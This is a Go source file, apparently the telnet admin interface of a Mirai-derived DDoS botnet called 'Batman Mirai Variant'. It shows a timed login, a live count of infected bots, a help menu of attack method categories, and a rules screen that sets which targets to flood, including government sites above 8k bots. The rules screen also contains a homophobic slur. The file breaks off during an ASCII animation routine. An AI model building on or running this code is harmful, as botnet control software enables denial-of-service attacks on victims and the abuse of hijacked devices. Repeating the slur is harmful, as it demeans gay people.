/*
╔═
║ . made by blazing
║ . stdhex not static anymore
║ . gang gang
║ . max peak 83 gigs
║ . @blazing_runs
║ . finished dev date 01/03/2020
╚═

*/
package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)
//@blazing_runs
type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; YOU HAVE 3s FOR USER AND 3s FOR PASS\007"))); err != nil {//93m
                this.conn.Close()
            }
    // Get username
    this.conn.SetDeadline(time.Now().Add(3 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                    _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                               .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                              d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                             d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                             888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                             888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                             YJGS8PYY888PYY8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                              Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                               '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                                 `                     `                                \r\n"))
            this.conn.Write([]byte("\033[37mTHIS IS A SKID RIP OF PUZZLES      `                     `                        \r\n"))
            this.conn.Write([]byte("\033[93m                               ║Username ════\033[37m➢ \x1b[37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(5 * time.Second))
    this.conn.Write([]byte("\033[93m                               ║Password ════\033[37m➢ \x1b[37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31m                               ║Invalid Credentials. Connection Logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d ~ Jokers Killed | Batman Mirai Variant | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m       _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m  .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37md888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37mYJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m  '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m    `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m    .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m   d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m  d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m  YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m   Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m    '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m      `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m           _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m      .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m     d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m    d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m    888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m    888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m    YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m     Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m      '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m        `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m               _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m          .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m         d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m        d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m        YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m         Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m          '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m            `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                  _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m             .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m            d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m           d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m           YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m            Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m             '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m               `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                         _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                    .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                   d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                  d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                  YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                   Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                    '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                      `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                             _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                        .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                       d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                      d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                      888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                      888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                      YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                       Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                        '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                          `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                       _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                                  .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                                 d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                                d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                                888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                                888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                                YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                                 Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                                  '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                                    `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                  _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                             .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                            d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                           d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                           YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                            Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                             '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                               `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                               _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                          .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                         d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                        d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                         Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                          '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                            `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[37m                                ╔═══\033[93m" + username + "\033[37m═══\033[93m$\r\n"))
        this.conn.Write([]byte("\033[93m                                ║═➢ \033[37m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "LOGOUT" || cmd == "logout" {
            return
        }
        if cmd == "" {
            continue
        }


/*
╔

═

╗

║

╚

═

╝

╠╣ 
 ╦ didnt even mean to do that ;)
 ╩
*/
        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                               _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                          .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                         d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                        d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                         Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                          '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                            `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }   //info
        if err != nil || cmd == "RULES" || cmd == "rules" {
            this.conn.Write([]byte("\033[37m                        ═══════════════\033[93m════════════════                 \r\n"))
            this.conn.Write([]byte("\033[37m                         no hitting gov\033[93mernment shit unless over 8k bots \r\n"))
            this.conn.Write([]byte("\033[37m                         no ddosing big\033[93m sites                           \r\n"))
            this.conn.Write([]byte("\033[37m                         no trying to h\033[93mit cloudflare...                 \r\n"))
            this.conn.Write([]byte("\033[37m                         no gays allowe\033[93md fucking retarded homos         \r\n"))
            this.conn.Write([]byte("\033[37m                        ═══════════════\033[93m════════════════                 \r\n"))
            continue
        }
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            botCount = clientList.Count()
            this.conn.Write([]byte("\033[37m                  ╔════════════════════\033[93m═════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ PUBLIC -  shows pub\033[93mlic methods          ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ PRIVATE -  shows pr\033[93mivate methods        ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ ADMIN -  Shows admi\033[93mn commands           ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ SPOOF -  Shows Show\033[93ms attacks [0bots]    ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ CREDITS -  Shows al\033[93ml the credits        ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ BAN -  Shows the av\033[93mailable banners      ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ TOOLS -  Shows list\033[93m of tools            ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ BOTS -  Shows bots \033[93mand archs            ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ RULES -  Read if yo\033[93mu dont get banned    ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ BANG -  little anim\033[93mation                ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ CLS -  Clears the t\033[93merminal              ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║ LOGOUT -  Exits fro\033[93mm the terminal       ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ╚══╦═════════════════\033[93m══════════════════╦══╝ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ╔══╩═════════════════\033[93m══════════════════╩══╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║        developed by\033[93m @blazing_runs       ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ║          OS system \033[93m[ Centos 6 ]         ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m                  ╚════════════════════\033[93m═════════════════════╝ \033[0m \r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m                  bot count \033[93m[ %d ]        \033[0m \r\n", botCount)))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == "BANG" || cmd == "bang" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
    
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
